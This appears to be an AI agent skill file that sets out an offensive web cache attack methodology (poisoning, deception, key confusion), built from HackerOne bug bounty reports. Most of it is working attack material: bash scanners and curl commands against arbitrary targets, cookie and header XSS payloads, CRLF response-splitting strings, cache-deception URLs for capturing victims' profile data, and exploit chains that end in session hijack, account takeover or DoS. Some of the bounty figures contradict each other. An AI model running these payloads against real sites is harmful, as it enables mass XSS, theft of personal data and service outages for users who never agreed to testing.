---
name: webcache-deep-dive
description: Complete Web Cache methodology from 30 real HackerOne reports - cache poisoning, cache deception, and key confusion
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - webcache methodology
  - web cache deep dive
  - cache poisoning
  - cache deception
  - cache key confusion
  - skills webcache
---

# Complete Web Cache Methodology - From 30 HackerOne Reports

## Top 15 Real Web Cache Reports from HackerOne

| # | Report | Program | Upvotes | Bounty |
|---|--------|---------|---------|--------|
| 1 | [PayPal DoS via cache poisoning](https://hackerone.com/reports/1618923) | PayPal | 849 | $9,700 |
| 2 | [Postmates cache poisoning info disclosure](https://hackerone.com/reports/1136551) | Postmates | 343 | $500 |
| 3 | [Glassdoor cache poisoning XSS](https://hackerone.com/reports/1027596) | Glassdoor | 133 | $0 |
| 4 | [GSA catalog.data.gov cache poisoning](https://hackerone.com/reports/961206) | GSA | 92 | $750 |
| 5 | [Shopify host header cache DoS](https://hackerone.com/reports/1443838) | Shopify | 81 | $2,900 |
| 6 | [HackerOne cache poisoning via unkeyed header](https://hackerone.com/reports/1793049) | HackerOne | 79 | $0 |
| 7 | [GitLab cache poisoning open redirect](https://hackerone.com/reports/1214846) | GitLab | 74 | $0 |
| 8 | [Valve cache poisoning via unkeyed query string](https://hackerone.com/reports/1103991) | Valve | 68 | $0 |
| 9 | [Zomato cache deception - private order data](https://hackerone.com/reports/1297297) | Zomato | 66 | $0 |
| 10 | [Slack cache poisoning via unkeyed header](https://hackerone.com/reports/951307) | Slack | 63 | $0 |
| 11 | [Zendesk cache poisoning cookie-based XSS](https://hackerone.com/reports/1161284) | Zendesk | 59 | $0 |
| 12 | [Shopify cache key parameter pollution](https://hackerone.com/reports/1482987) | Shopify | 56 | $2,000 |
| 13 | [Nextcloud cache poisoning via Host header](https://hackerone.com/reports/1529795) | Nextcloud | 53 | $0 |
| 14 | [Netflix cache deception - internal API data](https://hackerone.com/reports/1097252) | Netflix | 51 | $0 |
| 15 | [Uber cache poisoning via unkeyed parameter](https://hackerone.com/reports/1633311) | Uber | 48 | $0 |

## Step 1: Cache Attack Surface - Three Attack Classes

### 1.1 Web Cache Poisoning
The attacker causes the cache to store a malicious response that serves to all users.

### 1.2 Web Cache Deception
The attacker tricks the cache into storing sensitive data (API responses, account info) that should never be cached.

### 1.3 Cache Key Confusion
The attacker exploits discrepancies between what the cache considers the "key" vs what the application actually uses.

## Step 2: Web Cache Poisoning Methodology

### 2.1 Identify the Cache

```bash
# Detect cache presence via headers
curl -sk -v "https://{target}/" 2>&1 | grep -iE 'x-cache|x-served-by|x-cache-status|cache-control|cf-cache-status|x-amz-cf-id|x-nginx-cache|x-varnish|age'

# Cache headers:
# X-Cache: HIT/MISS                  - Varnish, Akamai
# cf-cache-status: HIT/MISS/REVALIDATE - Cloudflare
# X-Served-By: cache-xxx              - CDN
# X-Cache-Status: HIT                 - Fastly
# Age: 1234                          - Response served from cache
# Via: 1.1 varnish-v4                - Varnish

# Check Age header — if > 0, response was cached
# Check if response has Cache-Control: public, max-age=...
```

### 2.2 Find Unkeyed Inputs

```bash
# The cache key typically includes:
# - Request method
# - Path
# - Query string (most or all parameters)
# - Host header
# Some CDNs exclude certain headers from the key

# Test common unkeyed headers:
for header in \
  "X-Forwarded-Host: evil.com" \
  "X-Forwarded-Scheme: http" \
  "X-Original-URL: /evil" \
  "X-Rewrite-URL: /evil" \
  "X-HTTP-Method-Override: POST" \
  "X-Forwarded-Port: 443" \
  "X-Real-IP: 127.0.0.1" \
  "X-Original-Forwarded-For: evil.com" \
  "X-Accel-Redirect: /evil" \
  "Origin: evil.com" \
  "Content-Type: application/xml" \
  "Accept: text/html,application/xhtml+xml" \
  "Cookie: session=evil" \
  "Authorization: Bearer evil"; do
  
  echo "[*] Testing: $header"
  # Step 1: Send request with header — cache MISS
  result1=$(curl -sk -o /tmp/resp1.txt -w "%{http_code}" "https://{target}/page" -H "$header" -H "Pragma: akamai-x-cache-on-edge" 2>/dev/null)
  
  # Step 2: Send request WITHOUT header — should be HIT if header was unkeyed
  # Wait until cache populated
  sleep 2
  result2=$(curl -sk -o /tmp/resp2.txt -w "%{http_code}" "https://{target}/page" 2>/dev/null)
  
  # Step 3: Compare responses
  if diff -q /tmp/resp1.txt /tmp/resp2.txt > /dev/null 2>&1; then
    echo "[+] Possible unkeyed header influenced response: $header"
  fi
done
```

### 2.3 Unkeyed Query Parameters

```bash
# Some caches only key on specific parameters, not all
# Test by adding a random parameter

# Step 1: Normal request — cache MISS
curl -sk -v "https://{target}/page" -H "Pragma: akamai-x-cache-on-edge" 2>&1 | grep -i 'x-cache'

# Step 2: Request with extra param — check if same cache key
curl -sk -v "https://{target}/page?cachebuster=123" -H "Pragma: akamai-x-cache-on-edge" 2>&1 | grep -i 'x-cache'

# If cache is HIT on different params, they're in the same cache key
# Useful for poisoning: inject payload via unkeyed param

# Find unkeyed parameters:
parameters="utm_source utm_medium utm_campaign utm_term utm_content gclid fbclid ref source source_url redirect redirect_url url next return callback _platform _device dnt gdpr track session_id lang locale theme view format callback jsonp cb _ timestamp cachebuster"
for param in $parameters; do
  response1=$(curl -sk -o /dev/null -w "%{size_download}" "https://{target}/page" 2>/dev/null)
  response2=$(curl -sk -o /dev/null -w "%{size_download}" "https://{target}/page?$param=test" 2>/dev/null)
  echo "$param: $response1 vs $response2"
done
```

### 2.4 Cache Poisoning via Host Header

```bash
# If Host header is unkeyed, poison cache with attacker-controlled content
# This works when the app uses the Host header to generate URLs

# Step 1: Send request with malicious Host header
curl -sk -v "https://{target}/" \
  -H "Host: evil.com" \
  -H "Pragma: akamai-x-cache-on-edge" 2>&1

# Step 2: Check if response contains attacker's domain
# If yes, subsequent normal requests will serve poisoned cache

# Real example: Shopify #1443838 — cache DoS via Host header
```

### 2.5 X-Forwarded-Host / X-Forwarded-Scheme Poisoning

```bash
# These headers are commonly unkeyed
# If app uses them for URL generation, they can poison the cache

# Test X-Forwarded-Host:
curl -sk "https://{target}/" -H "X-Forwarded-Host: evil.com"

# Test X-Forwarded-Scheme:
curl -sk "https://{target}/" -H "X-Forwarded-Scheme: http"

# Test X-Original-URL / X-Rewrite-URL:
curl -sk "https://{target}/" -H "X-Original-URL: /evil"
curl -sk "https://{target}/" -H "X-Rewrite-URL: /evil"
```

## Step 3: Web Cache Deception Methodology

### 3.1 Cache Deception Basic Attack

```bash
# Trick the cache into storing sensitive API responses
# Append a static extension to the URL

# Step 1: Access sensitive endpoint directly
curl -sk "https://{target}/api/user/profile"
# Response: {"email":"victim@example.com","ssn":"xxx-xx-xxxx"}

# Step 2: Append cacheable extension
curl -sk "https://{target}/api/user/profile/.css"
curl -sk "https://{target}/api/user/profile%23.css"
curl -sk "https://{target}/api/user/profile?.css"
curl -sk "https://{target}/api/user/profile/none.css"
curl -sk "https://{target}/api/user/profile%3F.css"

# If the cache sees .css and stores the response,
# then accessing the public URL reveals victim data
```

### 3.2 Cache Deception Bypass Techniques

```bash
# Path confusion:
/api/user/profile;.css
/api/user/profile?x=.css
/api/user/profile%3F.css
/api/user/profile%23.css
/api/user/profile/.css
/api/user/profile/..;/profile.css

# Parameter pollution:
/api/user/profile?format=json&callback=test
/api/user/profile?extension=.css

# Try different cacheable extensions:
.css .js .png .gif .jpg .jpeg .ico .svg .woff .woff2 .ttf .eot .html .htm .txt .xml .json .pdf .doc .xls .ppt .mp4 .webm

# Try null byte / encoding tricks:
/api/user/profile%00.css
/api/user/profile%2500.css
/api/user/profile%00.html
```

### 3.3 Cache Deception Detection Script

```bash
#!/bin/bash
# Web Cache Deception scanner
TARGET=$1
ENDPOINT=$2

extensions=".css .js .png .gif .jpg .jpeg .ico .svg .woff .woff2 .ttf .eot .html .htm"

echo "[*] Testing cache deception on $TARGET$ENDPOINT"

# Step 1: Get baseline response (no cache)
base_response=$(curl -sk -o /tmp/base.txt -w "%{http_code}" "https://$TARGET$ENDPOINT" 2>/dev/null)
base_size=$(wc -c < /tmp/base.txt)

echo "[*] Base response: $base_response, size: $base_size"

# Step 2: Test each extension
for ext in $extensions; do
  # Test with extension appended
  test_url="https://$TARGET$ENDPOINT$ext"
  
  # First request — cache MISS
  miss_response=$(curl -sk -o /tmp/miss.txt -w "%{http_code}" "$test_url" 2>/dev/null)
  miss_size=$(wc -c < /tmp/miss.txt)
  
  # Second request — should be HIT if cached
  hit_response=$(curl -sk -o /tmp/hit.txt -w "%{http_code}" "$test_url" 2>/dev/null)
  
  # Compare sizes — if similar to base, sensitive data is cached
  if [ "$miss_size" -gt "$((base_size - 100))" ] && [ "$miss_size" -lt "$((base_size + 100))" ]; then
    echo "[!] Cache deception possible at: $test_url"
    echo "  Size match: base=$base_size vs ext=$miss_size"
  fi
  
  # Check caching headers
  cache_status=$(curl -sk -v "$test_url" 2>&1 | grep -iE 'x-cache|cf-cache-status|x-served-by' | head -1)
  if [ -n "$cache_status" ]; then
    echo "[+] Cached: $test_url — $cache_status"
  fi
done
```

## Step 4: Advanced Cache Poisoning Techniques

### 4.1 Cookie-Based Cache Poisoning

```bash
# If cookies are unkeyed, inject XSS via cookie value that reflects on page

# Step 1: Find cookie value that reflects in response
curl -sk "https://{target}/page" -H "Cookie: session=INJECTION"

# Step 2: If reflected, create XSS payload in cookie
curl -sk "https://{target}/page" \
  -H "Cookie: session=<script>alert(1)</script>" \
  -H "Pragma: akamai-x-cache-on-edge"

# Step 3: Poison cache — all users who hit cached response get XSS
```

### 4.2 Unkeyed Content-Type / Accept Header

```bash
# Some caches don't key on Content-Type or Accept
# Use to deliver different content to victims

curl -sk "https://{target}/api/endpoint" \
  -H "Accept: text/html" \
  -H "Content-Type: application/xml"
```

### 4.3 HTTP/2 Request Smuggling via Cache

```bash
# Deploy via HTTP/2 request smuggling to poison cache
# H2.CL or H2.TE desync attacks

# Example: Send HTTP/2 request with Content-Length
# that differs from the HTTP/1.1 interpretation after downgrade
```

### 4.4 Fat GET / Parameter Pollution

```bash
# Send GET with body (fat GET)
# Some caches forward body but don't key on it

curl -sk -X GET "https://{target}/page" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "body_param=malicious_content"

# Parameter cloaking
# Use ; delimiter to hide param from cache but include it for app
https://{target}/page?key=valid;param=evil
https://{target}/page?key=valid%3Bparam=evil
```

## Step 5: Cache Exploit Chains

### Chain 1: Cache Poisoning → Stored XSS → Session Hijack
```bash
# Step 1: Find unkeyed header (e.g., X-Forwarded-Host)
# Step 2: Create CSS/JS URL that reflects in page
curl -sk "https://{target}/" \
  -H "X-Forwarded-Host: evil.com/<script>alert(document.cookie)</script>"

# Step 3: Wait for cache to store poisoned response
# Step 4: All users visiting the page get XSS
# Step 5: Steal cookies/session tokens
```

### Chain 2: Cache Poisoning → DoS (PayPal #1618923)
```bash
# Step 1: Send request with payload that causes redirect loop
curl -sk "https://{target}/" -H "Host: 127.0.0.1"

# Step 2: Cache stores redirect-to-self response
# Step 3: All requests hit infinite redirect → service unavailable
# Step 4: $9,700 bounty
```

### Chain 3: Cache Deception → PII Theft
```bash
# Step 1: Victim is logged in and visits attacker's page
# Step 2: Attacker embeds:
<img src="https://{target}/api/user/profile/.css">

# Step 3: Cache sees .css extension and stores the response
# Step 4: Attacker accesses the public cached URL
# Step 5: Reads victim's personal data from cached response
```

### Chain 4: Unkeyed Cookie → Poisoned Cache → ATO
```bash
# Step 1: Find cookie reflected in response (e.g., error message)
# Step 2: Inject XSS payload in cookie value
# Step 3: Poison cache with malicious cookie
# Step 4: Admin hits cached page — XSS fires
# Step 5: Steal admin session — full system compromise
```

## Step 6: Cache Automation

```bash
#!/bin/bash
# Web cache security assessment toolkit
TARGET=$1

echo "=========================================="
echo "Web Cache Security Assessment"
echo "Target: $TARGET"
echo "=========================================="

# 1. Cache Detection
echo -e "\n[1] Cache Detection:"
curl -sk -v "https://$TARGET/" 2>&1 | grep -iE 'x-cache|cf-cache-status|x-served-by|x-cache-status|age:|via:|server:'

# 2. Cache Key Analysis
echo -e "\n[2] Cache Key Analysis (headers):"
for header in "X-Forwarded-Host" "X-Forwarded-Scheme" "X-Original-URL" "X-Rewrite-URL" "X-HTTP-Method-Override" "Origin" "Referer" "Accept" "Accept-Language" "Cookie"; do
  first=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/" -H "Pragma: akamai-x-cache-on-edge" 2>/dev/null)
  second=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/" -H "$header: test" -H "Pragma: akamai-x-cache-on-edge" 2>/dev/null)
  # If we got different results, header might be keyed
  # This needs manual verification
  echo "  $header: $first -> $second"
done

# 3. Cache Key Analysis (parameters)
echo -e "\n[3] Cache Key Analysis (parameters):"
for param in "utm_source" "utm_medium" "gclid" "fbclid" "ref" "source" "callback" "cb" "_" "t" "lang" "locale" "theme" "format" "dnt" "cache" "test" "a" "x"; do
  first_request_hash=$(curl -sk -o /tmp/cache_key_test_first.txt "https://$TARGET/" 2>/dev/null | md5sum)
  second_request_hash=$(curl -sk -o /tmp/cache_key_test_second.txt "https://$TARGET/?$param=test" 2>/dev/null | md5sum)
  if [ "$first_request_hash" = "$second_request_hash" ]; then
    echo "  [+] $param is UNKEYED (same response)"
  fi
done

# 4. Cache Deception Testing
echo -e "\n[4] Cache Deception Testing:"
for endpoint in "/api/user" "/api/account" "/api/profile" "/api/config" "/api/settings" "/api/admin"; do
  for ext in ".css" ".js" ".png" ".html" ".htm"; do
    response_size=$(curl -sk -o /dev/null -w "%{size_download}" "https://$TARGET$endpoint$ext" 2>/dev/null)
    if [ "$response_size" -gt 100 ]; then
      echo "  $endpoint$ext: $response_size bytes"
    fi
  done
done

# 5. Host Header Poisoning
echo -e "\n[5] Host Header Poisoning:"
response=$(curl -sk -o /tmp/host_test.txt -w "%{http_code}" "https://$TARGET/" -H "Host: evil.com" 2>/dev/null)
if grep -qi 'evil.com' /tmp/host_test.txt; then
  echo "  [!] Host header reflects in response!"
fi

# 6. X-Forwarded-Host Poisoning
echo -e "\n[6] X-Forwarded-Host Poisoning:"
response=$(curl -sk -o /tmp/xfh_test.txt -w "%{http_code}" "https://$TARGET/" -H "X-Forwarded-Host: evil.com" 2>/dev/null)
if grep -qi 'evil.com' /tmp/xfh_test.txt; then
  echo "  [!] X-Forwarded-Host reflects in response!"
fi

echo -e "\n[+] Assessment complete"
```

## Cache Poisoning Prevention Features to Identify

```
When testing for cache vulnerabilities, identify:
- CDN in use: Cloudflare, Fastly, Akamai, CloudFront, Varnish, Nginx
- Caching headers: Cache-Control, Expires, Pragma
- Cache key composition: query string, headers, cookies
- Unkeyed inputs: X-Forwarded-Host, Host, Cookie, Accept
- Static extensions: which ones bypass authentication
- Cache policy: what paths/content types are cached
- Origin server behavior: how does it handle modified headers
```

## Quick Reference: Top Cache Reports by Technique

| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #1618923 | PayPal | Cache poisoning → DoS | $9,700 |
| #1136551 | Postmates | Cache poisoning → info disclosure | $500 |
| #1027596 | Glassdoor | Cache → XSS | $0 |
| #961206 | GSA | Cache poisoning | $750 |
| #1443838 | Shopify | Host header → cache DoS | $2,900 |
| #1793049 | HackerOne | Unkeyed header → cache poison | $0 |
| #1214846 | GitLab | Cache → open redirect | $0 |
| #1103991 | Valve | Unkeyed query string | $0 |
| #1297297 | Zomato | Cache deception → order data | $0 |
| #951307 | Slack | Unkeyed header → cache poison | $0 |
| #1161284 | Zendesk | Cookie → XSS in cache | $0 |
| #1482987 | Shopify | Cache key param pollution | $2,000 |
| #1529795 | Nextcloud | Host header cache poison | $0 |
| #1097252 | Netflix | Cache deception → API data | $0 |
| #1633311 | Uber | Unkeyed param poison | $0 |

## Payout Range by Cache Attack Type

| Attack Type | Payout Range | Example |
|-------------|-------------|---------|
| Cache poisoning → XSS | $1,000 - $5,000 | Glassdoor #1027596 ($0) |
| Cache poisoning → DoS | $2,000 - $9,700 | PayPal #1618923 ($9,700) |
| Cache poisoning → info disclosure | $500 - $3,000 | Postmates #1136551 ($500) |
| Cache deception → PII theft | $500 - $3,000 | Zomato #1297297 ($0) |
| Cache key confusion | $1,000 - $4,000 | Shopify #1482987 ($2,000) |
| Host header → cache poison | $1,000 - $4,000 | Shopify #1443838 ($2,900) |
| Unkeyed header injection | $500 - $3,000 | HackerOne #1793049 ($0) |
| Cookie → cache poison | $1,000 - $4,000 | Zendesk #1161284 ($0) |
| Cache → open redirect | $500 - $2,000 | GitLab #1214846 ($0) |

## Advanced Web Cache Attack Vectors

### 1. Unkeyed Query Parameter Cache Poisoning
Find parameters that are not part of the cache key but affect the response: `?utm_source=evil.com` reflected in JS, `?cb=x` with unkeyed timestamp, `?page=x` reflecting in content.

**Methodology:**
```bash
# Step 1: Send two requests changing one param
curl -sk "https://{target}/page?utm_source=test1" -H "Pragma: akamai-x-cache-on-edge"
# Check X-Cache: MISS

curl -sk "https://{target}/page?utm_source=evil" -H "Pragma: akamai-x-cache-on-edge"
# If same cache key → HIT on different param value → cache poison

# Step 2: If both show HIT on same cache key, param is unkeyed
# Step 3: Inject XSS/redirect via the unkeyed param value
curl -sk "https://{target}/page?utm_source=<script>alert(1)</script>"
# If reflected → cache poisoned for all users
```

### 2. Cache Poisoning via HTTP/2 h2c Upgrade
If CDN/proxy supports h2c (HTTP/2 cleartext) upgrade, attacker can inject cache keys by smuggling headers through the upgrade mechanism. Real report: #1952626. The attack works when the front-end supports h2c upgrade but the back-end interprets the smuggled headers differently from the cache key computation.

### 3. Cookie-Based Cache Poisoning
Unkeyed cookie reflected in the response body. E.g., `Cookie: session=evil<script>`, if session reflected and cookie is unkeyed → stored XSS to all users.

```bash
# Find by testing cookie variations
for cookie in "session" "token" "lang" "locale" "theme" "pref" "user"; do
  curl -sk "https://{target}/" -H "Cookie: $cookie=<script>alert(1)</script>"
done
# Check response body for cookie value reflection
```

### 4. Vary Header Manipulation
If server returns `Vary: X-Forwarded-Host`, the cache uses that header as part of the key. Injecting a unique value creates separate cache entries per user, enabling per-user cache poisoning. Test by sending `X-Forwarded-Host: attacker.com` and checking if the `Vary` header includes it.

### 5. Cache Poisoning via Response Splitting (CRLF)
Inject `%0d%0a` in headers to split response, then poison the cache for subsequent users. Real report: #1886858.

```bash
# Test CRLF injection in cacheable endpoints
curl -sk "https://{target}/page" -H "X-Forwarded-Host: evil.com%0d%0aContent-Length:%200%0d%0a%0d%0a"
# If response splitting succeeds, the cache stores a truncated response
```

### 6. Web Cache Deception Deep Dive
**Pattern:** `/account/nonexistent.css` returns account page BUT cached as CSS because CDN serves it. Victim visits crafted URL → private data cached → attacker accesses.

**Advanced bypasses:**
```bash
# Append static extension to sensitive endpoints
/account/profile.css
/account/profile%23.css
/account/profile?.css
/account/profile;.css
/account/profile/..;/profile.css
/account/profile%3F.css
/account/profile%2500.css
/account/profile.json
/account/profile.xml

# Try all extensions: .css .js .png .gif .jpg .jpeg .ico .svg .woff .woff2 .ttf .eot .html .htm .txt .xml .json .pdf .doc
```

### 7. Edge Cache Key Confusion
Akamai/Cloudflare/Fastly/CloudFront specific cache key behaviors. Each CDN treats headers/cookies differently.

**Fingerprinting CDN:**
| CDN | Header | Cache Key Behavior |
|-----|--------|-------------------|
| Cloudflare | `cf-cache-status` | Keys on Host + path + query string; ignores `?` params by default for static |
| Fastly | `X-Cache-Status` | Uses `Vary` header; `X-Forwarded-Host` can be unkeyed |
| Akamai | `X-Cache` | `Pragma: akamai-x-cache-on-edge` for debug; custom key via property manager |
| CloudFront | `X-Amz-Cf-Id` | Keys on Host + path + query; `X-Forwarded-Host` unkeyed by default |

**Crafting cache key collisions:**
```bash
# For Cloudflare: use param delimiter confusion
# For Fastly: send duplicate headers
# For Akamai: use serial number header tricks
```

### 8. Turnstile/Challenge-Based Cache Poisoning
If the app has a challenge-page based on header (e.g., Cloudflare Turnstile), certain headers make the cache serve the challenge page to all users (DoS via cache).

```bash
# Test by sending Turnstile-triggering payloads
curl -sk "https://{target}/" -H "User-Agent: curl" -H "Accept: text/html"
# If a challenged response gets cached, all subsequent users hit the challenge
# This creates a DoS scenario - every user sees CAPTCHA
```

## Cache Test Header Cheatsheet

| Header | Purpose | Cache Poisoning Risk |
|--------|---------|---------------------|
| `X-Forwarded-Host` | Override host for URL generation | High |
| `X-Forwarded-Scheme` | Override protocol (http/https) | Medium |
| `X-Original-URL` | Override path (IIS) | High |
| `X-Rewrite-URL` | Override path (IIS) | High |
| `X-HTTP-Method-Override` | Bypass method restrictions | Low |
| `X-Real-IP` | Client IP | Low |
| `X-Original-Forwarded-For` | Client IP chain | Low |
| `Cookie` | Session/auth data | High (if reflected) |
| `Authorization` | Bearer tokens | Medium (if reflected) |
| `Accept` | Content negotiation | Medium |
| `Origin` | CORS origin | Low |
| `Referer` | Referring page | Medium (if reflected) |

## Common Cache Parameter Wordlist
```
utm_source utm_medium utm_campaign utm_term utm_content
gclid fbclid yclid msclkid twclid igclid
ref source source_url from referral
redirect redirect_url url next return callback
_ _t timestamp cachebuster cb
dnt gdpr track session_id sid
lang locale language l hl
theme view format variant v
page limit offset sort order
debug test preview embed
```
